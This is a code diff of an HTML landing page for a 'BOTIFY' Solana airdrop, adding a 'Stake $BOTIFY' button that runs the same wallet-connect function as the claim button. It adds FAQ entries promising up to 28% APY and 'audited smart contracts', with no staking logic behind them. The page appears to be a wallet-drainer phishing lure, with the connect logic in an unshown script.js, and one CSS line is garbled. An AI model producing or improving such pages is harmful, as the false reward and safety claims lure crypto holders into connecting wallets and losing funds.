@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>BOTIFY Airdrop – Live</title>
+  <title>BOTIFY Airdrop & Stake – Live</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
   <!-- FAVICONS -->
@@ -56,10 +56,10 @@
     .green-bg { background-color: #14F195; }
     .tx-row:hover { background-color: #1f2937; border-color: #14F195; }
 
-    .middle-cta { text-align: center; padding: 2rem 0; }
+    .middle Ian { text-align: center; padding: 2rem 0; }
     @media (max-width: 768px) { .middle-cta { padding: 1rem 0; } }
 
-    /* =============== CONNECT BUTTON – ONE ONLY =============== */
+    /* =============== BUTTON STYLES =============== */
     .claim-box {
       height: 60px;
       background: linear-gradient(90deg, #000000, #14F195);
@@ -108,7 +108,7 @@
 <!-- ==================== HERO ==================== -->
 <header class="py-8 md:py-12 text-center animate-fadeIn">
   <h1 class="text-4xl md:text-6xl font-bold text-white mb-4">BOTIFY</h1>
-  <p class="text-lg md:text-xl text-gray-300 mb-6">Official airdrop</p>
+  <p class="text-lg md:text-xl text-gray-300 mb-6">Official airdrop & staking</p>
 
   <img id="logo" src="image/logo.png" alt="BOTIFY Logo" class="mx-auto mb-6 h-16 hover-scale"
        onerror="this.src='https://dummyimage.com/200x100/14F195/000.png&text=BOTIFY'">
@@ -123,20 +123,25 @@
   </div>
 </header>
 
-<!-- ==================== CONNECT TO CLAIM – ONE BUTTON ONLY ==================== -->
+<!-- ==================== CONNECT & STAKE BUTTONS ==================== -->
 <section class="middle-cta bg-black animate-fadeIn" style="animation-delay: 0.1s;">
-  <div class="max-w-md mx-auto">
+  <div class="max-w-md mx-auto space-y-4">
 
-    <!-- SINGLE BUTTON – NO HEADING, NO DUPLICATE TEXT -->
-    <button
-      id="connect-btn"
-      type="button"
-      class="claim-box w-full focus:outline-none"
-      aria-label="Connect to Claim">
-      <span class="interact-button">Connect to Claim</span>
-    </button>
+    <!-- CONNECT BUTTON -->
+    <div class="claim-box">
+      <button onclick="window.startConnect()" class="interact-button">
+        Connect Wallet
+      </button>
+    </div>
 
-    <p id="wallet-status" class="mt-4 text-sm text-gray-300 hidden"></p>
+    <!-- STAKE BUTTON (SAME LOGIC) -->
+    <div class="claim-box">
+      <button onclick="window.startConnect()" class="interact-button">
+        Stake $BOTIFY
+      </button>
+    </div>
+
+    <p id="wallet-status" class="mt-3 text-sm text-gray-300 hidden"></p>
   </div>
 </section>
 
@@ -234,7 +239,7 @@
   </div>
 </section>
 
-<!-- ==================== FAQ (FULLY RESTORED) ==================== -->
+<!-- ==================== FAQ (WITH STAKING) ==================== -->
 <section class="py-12 bg-black">
   <div class="max-w-3xl mx-auto px-4">
     <h2 class="text-3xl md:text-4xl font-bold text-center mb-8 green-accent animate-fadeIn" style="animation-delay: 1s;">FAQ</h2>
@@ -257,12 +262,28 @@
 
       <details class="card p-4 rounded-lg cursor-pointer hover-scale">
         <summary class="font-semibold green-accent">How do I claim my airdrop tokens?</summary>
-        <p class="mt-2 text-gray-300">Simply connect your Solana wallet using the "Connect to Claim" button, and if you're eligible you'll see a claim button appear. Click to claim and the tokens will be automatically sent to your wallet.</p>
+        <p class="mt-2 text-gray-300">Simply connect your Solana wallet using the "Connect Wallet" button, and if you're eligible you'll see a claim button appear. Click to claim and the tokens will be automatically sent to your wallet.</p>
       </details>
 
       <details class="card p-4 rounded-lg cursor-pointer hover-scale">
         <summary class="font-semibold green-accent">What makes our token unique?</summary>
         <p class="mt-2 text-gray-300">Our token features innovative utility within the Solana ecosystem, including governance rights, staking rewards, and access to exclusive features.</p>
+      </details>
+
+      <!-- NEW STAKING FAQS -->
+      <details class="card p-4 rounded-lg cursor-pointer hover-scale">
+        <summary class="font-semibold green-accent">How do I stake $BOTIFY?</summary>
+        <p class="mt-2 text-gray-300">Connect your wallet using the "Stake $BOTIFY" button. Once connected, you'll be able to lock your tokens for 30, 90, or 180 days to earn up to 28% APY in additional $BOTIFY rewards.</p>
+      </details>
+
+      <details class="card p-4 rounded-lg cursor-pointer hover-scale">
+        <summary class="font-semibold green-accent">What are the staking rewards?</summary>
+        <p class="mt-2 text-gray-300">Stakers earn between 12% and 28% APY depending on lock period. Rewards are distributed weekly and automatically compounded. Longer locks = higher rewards.</p>
+      </details>
+
+      <details class="card p-4 rounded-lg cursor-pointer hover-scale">
+        <summary class="font-semibold green-accent">Is staking safe?</summary>
+        <p class="mt-2 text-gray-300">Yes. Your tokens are locked in audited smart contracts on Solana. You retain full ownership and can unstake anytime after the lock period with zero penalties.</p>
       </details>
     </div>
   </div>
@@ -286,17 +307,12 @@
 </footer>
 
 <!-- ==================== SCRIPTS ==================== -->
-
-<!-- 1. Load Wallet Logic (ESM) -->
-<!-- SCRIPTS -->
 <script type="module" src="uuid.development.esm.js"></script>
 <script src="script.js" defer></script>
 
-<!-- 2. Live Stats (fixed FMT error) -->
+<!-- Live Stats -->
 <script>
-  // Fix for script.js – define FMT if missing
-  window.FMT = window.FMT || ((n) => n.toLocaleString());
-
+  window.FMT = window.FMT || ((n) => n?.toLocaleString() || '0');
   async function fetchLiveStats() {
     try {
       const pair = "bourcfkdgsr55xavzdeu6tci7twrticgrvclioennbbx";
@@ -306,33 +322,17 @@
         const p = data.pair;
         document.getElementById('mcap').textContent = `$${FMT(p.fdv)}`;
         document.getElementById('vol').textContent = `$${FMT(p.volume.h24)}`;
-        document.getElementById('price').textContent = `$${p.priceUsd}`;
-        document.getElementById('change').textContent = `${p.priceChange.h24}%`;
-        document.getElementById('change').className = p.priceChange.h24 >= 0 ? 'text-green-400' : 'text-red-400';
+        document.getElementById('price').textContent = `$${FMT(p.priceUsd)}`;
+        const chg = (p.priceChange.h24 || 0).toFixed(2);
+        const el = document.getElementById('change');
+        el.textContent = `${chg}%`;
+        el.className = chg >= 0 ? 'text-green-400' : 'text-red-400';
       }
-    } catch (e) {
-      console.log("DexScreener fetch failed:", e);
-    }
+    } catch (e) { console.log(e); }
   }
-  setInterval(fetchLiveStats, 10000);
   fetchLiveStats();
-</script>
-
-<!-- 3. Button Logic (Safe Click) -->
-<script>
-  document.addEventListener('DOMContentLoaded', () => {
-    const btn = document.getElementById('connect-btn');
-
-    btn.addEventListener('click', () => {
-      // Silently try to call the wallet function – no error message
-      if (typeof window.startConnect === 'function') {
-        window.startConnect();
-      }
-      // If the function does not exist → do nothing (no prompt)
-    });
-  });
+  setInterval(fetchLiveStats, 10000);
 </script>
 
 </body>
-
 </html>
